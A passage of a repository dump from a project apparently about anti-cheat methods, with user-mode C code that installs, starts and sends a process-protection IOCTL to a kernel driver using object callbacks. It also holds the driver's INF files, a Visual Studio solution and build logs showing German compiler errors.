//
// Sends unprotect callback ioctl to the driver.
//

BOOL TcProcessNameCallback (
    _In_reads_(NAME_SIZE+1) PCWSTR  pnametoprotect,
    _In_ ULONG ulOperation
)
{
    TD_PROTECTNAME_INPUT ProtectNameCallbackInput = {0};
    BOOL Result = FALSE;
    DWORD BytesReturned = 0;

    LOG_INFO (L"TcProtectNameCallback: entering - nametoprotect %ls", pnametoprotect);

    // Copy the name of the exececutible to protect into IOCTL structure
    if (!pnametoprotect) {
        LOG_INFO_FAILURE (L"TcProcessNameCallback: NULL Protect Name");
        Result = FALSE;
        goto Exit;
    }
    wcsncpy_s(ProtectNameCallbackInput.Name, pnametoprotect, NAME_SIZE);
    ProtectNameCallbackInput.Operation = ulOperation;


    LOG_INFO (L"TcProtectNameCallback: IOCTL sending nametoprotect %ls", ProtectNameCallbackInput.Name);

    Result = DeviceIoControl (
        TcDeviceHandle,
        TD_IOCTL_PROTECT_NAME_CALLBACK,
        &ProtectNameCallbackInput,
        sizeof(ProtectNameCallbackInput),
        NULL,
        0,
        &BytesReturned,
        NULL
    );

    if (Result == TRUE)
    {
        LOG_INFO (L"TcProcessNameCallback: succeeded");
    }
    else
    {
        LOG_INFO_FAILURE (L"TcProcessNameCallback: DeviceIoControl failed, last error 0x%x", GetLastError());
    }

Exit:

    LOG_INFO (L"TcProcessNameCallback: exiting");
    return Result;
}



//
// TcInitializeGlobals
//

BOOL TcInitializeGlobals()
{
    WCHAR SysDir[MAX_PATH];
    BOOL ReturnValue = FALSE;

#if !defined (_WIN64)

    BOOL Result = FALSE;
    BOOL Wow64Process = FALSE;
    PVOID OldWowRedirectionValue = NULL;

    Result = IsWow64Process (
        GetCurrentProcess(),
        &Wow64Process
    );

    if (Result == FALSE) 
    {
        LOG_INFO_FAILURE (L"IsWow64Process failed, last error 0x%x", GetLastError());
        goto Exit;
    }

    if (Wow64Process == TRUE)
    {
        //
        // Disable FS redirection to make sure a 32 bit test process will
        // copy our (64 bit) driver to system32\drivers rather than syswow64\drivers.
        //

        Result = Wow64DisableWow64FsRedirection (&OldWowRedirectionValue);

        if (Result == FALSE) 
        {
            LOG_INFO_FAILURE (L"Wow64DisableWow64FsRedirection failed, last error 0x%x", GetLastError());
            goto Exit;
        }
    }

#endif

    //
    // Open the service control manager if not already open
    //

    if (TcScmHandle == NULL) {
        TcScmHandle = OpenSCManager (
            NULL,
            NULL,
            SC_MANAGER_ALL_ACCESS
        );
    
        if (TcScmHandle == NULL)
        {
            LOG_INFO_FAILURE (L"OpenSCManager failed, last error 0x%x", GetLastError());
            goto Exit;
        }
    }
    //
    // Construct driver path.
    //

    UINT Size = GetSystemDirectoryW(SysDir, ARRAYSIZE(SysDir));

    if (Size == 0)
    {
        LOG_INFO_FAILURE (L"GetSystemDirectory failed, last error 0x%x", GetLastError());
        goto Exit;
    }

    HRESULT hr = StringCchPrintfW(
        TcDriverPath,
        ARRAYSIZE(TcDriverPath),
        L"%ls\\drivers\\%ls.sys",
        SysDir,
        TD_DRIVER_NAME
    );

    if (FAILED (hr))
    {
        LOG_INFO_FAILURE (L"StringCchPrintf failed, hr 0x%08x", hr);
        goto Exit;
    }

    ReturnValue = TRUE;

Exit:
    return ReturnValue;
}


//
// TcUnInitialize
//

BOOL TcCleanupSCM()
{
    if (TcScmHandle != NULL) {
        CloseServiceHandle(TcScmHandle);
        TcScmHandle = NULL;
    }

    return TRUE;
}

//
// TcLoadDriver
//

BOOL TcLoadDriver()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcLoadDriver: Entering");

    //
    // First, uninstall and unload the driver. 
    //

    ReturnValue = TcUnloadDriver();

    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (L"TcUnloadDriver failed");
        goto Exit;
    }

    //
    // Copy the driver to system32\drivers
    //

    ReturnValue = CopyFileW(TD_DRIVER_NAME_WITH_EXT, TcDriverPath, FALSE);

    if (ReturnValue == FALSE)
    {
        LOG_INFO_FAILURE (
            L"CopyFile(%ls, %ls) failed, last error 0x%x",
            TD_DRIVER_NAME_WITH_EXT, TcDriverPath, GetLastError()
        );

        goto Exit;
    }

    //
    // Install the driver.
    //

    ReturnValue = TcCreateService();

    if (ReturnValue == FALSE)
    {
        LOG_INFO_FAILURE (L"TcCreateService failed");
        goto Exit;
    }

    //
    // Load the driver.
    //

    ReturnValue = TcStartService();

    if (ReturnValue == FALSE)
    {
        LOG_INFO_FAILURE (L"TcStartService failed");
        goto Exit;
    }


    ReturnValue = TRUE;

Exit:

    LOG_INFO(L"TcLoadDriver: Exiting");
    return ReturnValue;
}



//
// TcUnloadDriver
//

BOOL TcUnloadDriver()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcUnloadDriver: Entering");


    //
    // Unload the driver.
    //

    ReturnValue = TcStopService();

    if (ReturnValue == FALSE)
    {
        LOG_INFO_FAILURE (L"TcStopService failed");
        goto Exit;
    }

    //
    // Delete the service.
    //

    ReturnValue = TcDeleteService();

    if (ReturnValue == FALSE)
    {
        LOG_INFO_FAILURE (L"TcDeleteService failed");
        goto Exit;
    }

    ReturnValue = TRUE;

Exit:

    LOG_INFO(L"TcUnloadDriver: Exiting");

    return ReturnValue;
}

//
// TcGetServiceState
//

BOOL TcGetServiceState (
    _In_ SC_HANDLE ServiceHandle,
    _Out_ DWORD* State
)
{
    SERVICE_STATUS_PROCESS ServiceStatus;
    DWORD BytesNeeded;

    *State = 0;
	
    BOOL Result = QueryServiceStatusEx ( 
        ServiceHandle,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&ServiceStatus,
        sizeof(ServiceStatus),
        &BytesNeeded
        );

    if (Result == FALSE)
    {
        LOG_INFO_FAILURE (L"TcGetServiceState: QueryServiceStatusEx failed, last error 0x%x", GetLastError());
        return FALSE;
    }

    *State = ServiceStatus.dwCurrentState;

    return TRUE;
}

//
// Wait for service to enter specified state.
//

BOOL TcWaitForServiceState (
    _In_ SC_HANDLE ServiceHandle,
    _In_ DWORD State
)
{
    for (;;)
    {
        LOG_INFO (L"TcWaitForServiceState: Waiting for service %p to enter state %u...", (DWORD_PTR)ServiceHandle, State);

        DWORD ServiceState;
        BOOL Result = TcGetServiceState (ServiceHandle, &ServiceState);

        if (Result == FALSE)
        {
            return FALSE;
        }

        if (ServiceState == State)
        {
            break;
        }

        Sleep (1000);
    }

    return TRUE;
}

//
// TcCreateService
//

BOOL TcCreateService()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcCreateService: Entering");

    //
    // Create the service
    //

    SC_HANDLE ServiceHandle = CreateServiceW(
        TcScmHandle,            // handle to SC manager
        TD_DRIVER_NAME,         // name of service
        TD_DRIVER_NAME,         // display name
        SERVICE_ALL_ACCESS,     // access mask
        SERVICE_KERNEL_DRIVER,  // service type
        SERVICE_DEMAND_START,   // start type
        SERVICE_ERROR_NORMAL,   // error control
        TcDriverPath,           // full path to driver
        NULL,                   // load ordering
        NULL,                   // tag id
        NULL,                   // dependency
        NULL,                   // account name
        NULL                    // password
    );

    DWORD LastError = GetLastError();

    if (ServiceHandle == NULL && LastError != ERROR_SERVICE_EXISTS)
    {
        LOG_INFO_FAILURE (L"CreateService failed, last error 0x%x", LastError);
        goto Exit;
    }

    ReturnValue = TRUE;

Exit:

    if (ServiceHandle)
    {
        CloseServiceHandle (ServiceHandle);
    }

    LOG_INFO(L"TcCreateService: Exiting");

    return ReturnValue;
}

//
// TcStartService
//

BOOL TcStartService()
{
    BOOL ReturnValue = FALSE;

    //
    // Open the service. The function assumes that
    // TdCreateService has been called before this one
    // and the service is already installed.
    //

    SC_HANDLE ServiceHandle = OpenServiceW(
        TcScmHandle,
        TD_DRIVER_NAME,
        SERVICE_ALL_ACCESS
    );

    if (ServiceHandle == NULL)
    {
        LOG_INFO_FAILURE (L"TcStartService: OpenService failed, last error 0x%x", GetLastError());
        goto Exit;
    }

    //
    // Start the service
    //

    if (! StartService (ServiceHandle, 0, NULL))
    {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
        {
            LOG_INFO_FAILURE (L"TcStartService: StartService failed, last error 0x%x", GetLastError());
            goto Exit;
        }
    }

    if (FALSE == TcWaitForServiceState (ServiceHandle, SERVICE_RUNNING))
    {
        goto Exit;
    }
    
    ReturnValue = TRUE;

Exit:

    if (ServiceHandle)
    {
        CloseServiceHandle (ServiceHandle);
    }

    return ReturnValue;
}


//
// TcStopService
//

BOOL TcStopService()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcStopService: Entering");

    //
    // Open the service so we can stop it
    //

    SC_HANDLE ServiceHandle = OpenServiceW(
        TcScmHandle,
        TD_DRIVER_NAME,
        SERVICE_ALL_ACCESS
    );

    DWORD LastError = GetLastError();

    if (ServiceHandle == NULL)
    {
        if (LastError == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            ReturnValue = TRUE;
        }
        else
        {
            LOG_INFO_FAILURE (L"TcStopService: OpenService failed, last error 0x%x", LastError);
        }

        goto Exit;
    }

    //
    // Stop the service
    //

    SERVICE_STATUS ServiceStatus;

    if (FALSE == ControlService (ServiceHandle, SERVICE_CONTROL_STOP, &ServiceStatus))
    {
        LastError = GetLastError();

        if (LastError != ERROR_SERVICE_NOT_ACTIVE)
        {
            LOG_INFO_FAILURE (L"TcStopService: ControlService failed, last error 0x%x", LastError);
            goto Exit;
        }
    }

    if (FALSE == TcWaitForServiceState (ServiceHandle, SERVICE_STOPPED))
    {
        goto Exit;
    }
    
    ReturnValue = TRUE;

Exit:

    if (ServiceHandle)
    {
        CloseServiceHandle (ServiceHandle);
    }

    LOG_INFO(L"TcStopService: Exiting");

    return ReturnValue;
}

//
// TcDeleteService
//

BOOL TcDeleteService()
{
    BOOL ReturnValue = FALSE;


    LOG_INFO(L"TcDeleteService: Entering");

    //
    // Open the service so we can delete it
    //

    SC_HANDLE ServiceHandle = OpenServiceW(
        TcScmHandle,
        TD_DRIVER_NAME,
        SERVICE_ALL_ACCESS
    );

    DWORD LastError = GetLastError();

    if (ServiceHandle == NULL)
    {
        if (LastError == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            ReturnValue = TRUE;
        }
        else
        {
            LOG_INFO_FAILURE (L"TcDeleteService: OpenService failed, last error 0x%x", LastError);
        }

        goto Exit;
    }

    //
    // Delete the service
    //

    if (! DeleteService (ServiceHandle))
    {
        LastError = GetLastError();

        if (LastError != ERROR_SERVICE_MARKED_FOR_DELETE)
        {
            LOG_INFO_FAILURE (L"TcDeleteService: DeleteService failed, last error 0x%x", LastError);
            goto Exit;
        }
    }

    ReturnValue = TRUE;

Exit:

    if (ServiceHandle)
    {
        CloseServiceHandle (ServiceHandle);
    }

    LOG_INFO(L"TcDeleteService: Exiting");

    return ReturnValue;
}

//
// TcOpenDevice
//

BOOL TcOpenDevice()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcOpenDevice: Entering");


    //
    // Open the device if not already opened
    //
    if (TcDeviceHandle == INVALID_HANDLE_VALUE) {
        TcDeviceHandle = CreateFileW(
            TD_WIN32_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (TcDeviceHandle == INVALID_HANDLE_VALUE)
        {
            LOG_INFO_FAILURE (L"TcOpenDevice: CreateFile(%ls) failed, last error 0x%x", TD_WIN32_DEVICE_NAME, GetLastError());
            goto Exit;
        }
    }


    ReturnValue = TRUE;

Exit:

    LOG_INFO(L"TcOpenDevice: Exiting");
    return ReturnValue;
}

//
// TcOpenDevice
//

BOOL TcCloseDevice()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(L"TcCloseDevice: Entering");

    //
    // Close our handle to the device.
    //

    if (TcDeviceHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle (TcDeviceHandle);
        TcDeviceHandle = INVALID_HANDLE_VALUE;
    }

    ReturnValue = TRUE;

    LOG_INFO(L"TcCloseDevice: Exiting");
    return ReturnValue;
}
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Debug/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer = 08/28/2018,14.51.23.805

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
;


;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NTx86

[Standard.NTx86]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
;


[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
;


[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = 1.15

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27703.2042
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ObRegisterCallbacksDriver", "ObRegisterCallbacksDriver\ObRegisterCallbacksDriver.vcxproj", "{0443E933-8D93-4976-97D6-57ABA9017F21}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM.ActiveCfg = Debug|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM.Build.0 = Debug|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM.Deploy.0 = Debug|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM64.Build.0 = Debug|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x64.ActiveCfg = Debug|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x64.Build.0 = Debug|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x64.Deploy.0 = Debug|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x86.ActiveCfg = Debug|Win32
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x86.Build.0 = Debug|Win32
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Debug|x86.Deploy.0 = Debug|Win32
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM.ActiveCfg = Release|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM.Build.0 = Release|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM.Deploy.0 = Release|ARM
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM64.ActiveCfg = Release|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM64.Build.0 = Release|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|ARM64.Deploy.0 = Release|ARM64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x64.ActiveCfg = Release|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x64.Build.0 = Release|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x64.Deploy.0 = Release|x64
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x86.ActiveCfg = Release|Win32
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x86.Build.0 = Release|Win32
		{0443E933-8D93-4976-97D6-57ABA9017F21}.Release|x86.Deploy.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D192F2FC-F5D7-44FC-BB16-5239DAB9733A}
	EndGlobalSection
EndGlobal

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegist.0443E933.tlog/ObRegisterCallbacksDriver.lastbuildstate`:

```lastbuildstate
#TargetFrameworkVersion=v4.5:PlatformToolSet=WindowsKernelModeDriver10.0:EnableManagedIncrementalBuild=false:VCToolArchitecture=Native32Bit:WindowsTargetPlatformVersion=10.0.17134.0
Debug|Win32|C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\|

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegist.0443E933.tlog/stampinf.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
-d "*" -a "x86" -v "*" -k "1.15"  -x -f Debug\ObRegisterCallbacksDriver.inf -d "*" -a "x86" -v "*" -k "1.15"  -x C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegist.0443E933.tlog/stampinf.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegist.0443E933.tlog/stampinf.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer = 08/28/2018,14.51.23.805

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
;


;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NTx86

[Standard.NTx86]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
;


[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
;


[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = 1.15

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/Debug/ObRegisterCallbacksDriver.log`:

```log
  Building 'ObRegisterCallbacksDriver' with toolset 'WindowsKernelModeDriver10.0' and the 'Universal' target platform.
  Stamping Debug\ObRegisterCallbacksDriver.inf
  Stamping [Version] section with DriverVer=08/28/2018,14.51.23.805
  driver.cpp
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(128): error C3861: "PsGetThreadProcessId": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(141): error C3861: "PsGetCurrentProcessId": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(189): error C3861: "TdSetCallContext": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(208): error C3861: "PsGetCurrentProcessId": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(209): error C3861: "PsGetCurrentThreadId": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(253): error C2065: "CBTdPostOperationCallback": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(259): error C2065: "CBTdPostOperationCallback": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(262): error C2065: "CBAltitude": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(264): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(264): error C2228: Links von ".Version" müssen sich in einer Klasse/Struktur/Union befinden
  c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(264): note: Typ ist "unknown-type"
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(265): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(265): error C2228: Links von ".OperationRegistrationCount" müssen sich in einer Klasse/Struktur/Union befinden
  c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(265): note: Typ ist "unknown-type"
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(266): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(266): error C2228: Links von ".Altitude" müssen sich in einer Klasse/Struktur/Union befinden
  c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(266): note: Typ ist "unknown-type"
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(266): error C2065: "CBAltitude": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(267): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(267): error C2228: Links von ".RegistrationContext" müssen sich in einer Klasse/Struktur/Union befinden
  c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(267): note: Typ ist "unknown-type"
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(267): error C2065: "CBCallbackRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(268): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(268): error C2228: Links von ".OperationRegistration" müssen sich in einer Klasse/Struktur/Union befinden
  c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(268): note: Typ ist "unknown-type"
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(272): error C2065: "CBObRegistration": nichtdeklarierter Bezeichner
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(273): error C2065: "pCBRegistrationHandle": nichtdeklarierter Bezeichner
